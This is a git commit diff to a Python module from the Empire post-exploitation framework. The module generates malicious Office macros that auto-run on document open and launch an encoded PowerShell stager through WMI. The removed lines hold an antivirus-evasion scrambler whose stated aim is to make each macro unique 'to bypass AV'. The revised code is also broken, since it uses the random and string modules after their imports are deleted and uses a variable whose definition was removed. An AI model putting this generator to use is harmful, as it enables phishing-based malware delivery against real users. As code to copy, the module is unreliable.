34c10bc762db3bbfe6645d0a76779f3be4ac956d
ceramicskate0 <ceramicskate0@users.noreply.github.com>
2017-05-16 19:53:34 -0500

    Update and rename MACRO_Scammbler_For_Empire_Stager.py to MACRO_For_Empire_Stager.py

--- MACRO_For_Empire_Stager.py
+++ MACRO_For_Empire_Stager.py
@@ -1,17 +1,15 @@
 from lib.common import helpers
-import random
-import random, string
 
 class Stager:
 
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Scrambled_Macro',
+            'Name': 'Macro',
 
-            'Author': ['@enigma0x3', '@harmj0y', 'Rob Schoemaker'],
+            'Author': ['@enigma0x3', '@harmj0y'],
 
-            'Description': ('Generates a scrambled office macro for Empire, compatible with office 97-2003, and 2007 file types.\nEach generated macro is unique in order to bypass AV.'),
+            'Description': ('Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.'),
 
             'Comments': [
                 'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
@@ -27,6 +25,11 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Language' : {
+                'Description'   :   'Language of the stager to generate.',
+                'Required'      :   True,
+                'Value'         :   'powershell'
+            },
             'StagerRetries' : {
                 'Description'   :   'Times for the stager to retry connecting.',
                 'Required'      :   False,
@@ -35,12 +38,7 @@ class Stager:
             'OutFile' : {
                 'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                 'Required'      :   False,
-                'Value'         :   '/tmp/scrambled'
-            },
-            'NoiseLevel' : {
-                'Description'   :   'Sets the amount of noise to add (default=3, 0=no noise)',
-                'Required'      :   True,
-                'Value'         :   '3'
+                'Value'         :   '/tmp/macro'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -67,72 +65,36 @@ class Stager:
             # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
-                self.options[option]['Value'] = valu
+                self.options[option]['Value'] = value
 
-    def addnoise(self, payload,level=1):
-        charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-+={}[];:|,.<>?~_'
-        noisechars=''
-
-        for character in charset:
-            if(not character in payload):
-                noisechars += character
-
-        scrambledpayload = ''
-
-        random.seed()
-
-        shuffled = "".join(random.sample(noisechars, len(noisechars)))
-        noisechars = shuffled
-
-        for character in payload:
-            action = random.randint(0,level)
-            while(action!=0):
-                scrambledpayload += random.choice(noisechars)
-                action = random.randint(0,level)
-            scrambledpayload += character
-
-        return scrambledpayload, noisechars
 
     def generate(self):
 
         # extract all of our options
+        language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
-        noiselevel = int(self.options['NoiseLevel']['Value'])
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
-		
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+            
+        Str = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
+        NoiseMacVari = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
+        Counter = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
+        Method=''.join(random.choice(string.letters) for i in range(LengthOfVari))
+
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
-        else:	   
-	    LengthOfVari = random.randint(1,35)
-	    LengthOfChunks = random.randint(1,100)
-		
-            launcher, noise = self.addnoise(launcher, noiselevel)
-            chunks = list(helpers.chunks(launcher, LengthOfChunks))
-		
-            Str = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
-            NoiseMacVari = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
-            Counter = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
-            Method=''.join(random.choice(string.letters) for i in range(LengthOfVari))
-		
+        else:
+            chunks = list(helpers.chunks(launcher, 50))
             payload = "\tDim "+Str+" As String\n"
-            payload += "\tDim "+NoiseMacVari+" As String\n"
-            payload += "\tDim "+Counter+" As Integer\n"
-            payload += "\t"+NoiseMacVari+" = \"" + noise + "\"\n"
             payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
-	
             for chunk in chunks[1:]:
                 payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"
-
-            payload += "\tFor "+Counter+" = 1 to len("+NoiseMacVari+")\n"
-            payload += "\t"+Str+" = replace("+Str+",mid("+NoiseMacVari+","+Counter+",1),\"\")\n"
-            payload += "\tNext\n"
 
             macro = "Sub Auto_Open()\n"
             macro += "\t"+Method+"\n"
@@ -156,5 +118,5 @@ class Stager:
             macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
             macro += "\tobjProcess.Create "+Str+", Null, objConfig, intProcessID\n"
             macro += "End Function\n"
-            	    
- 	    return macro
+
+            return macro
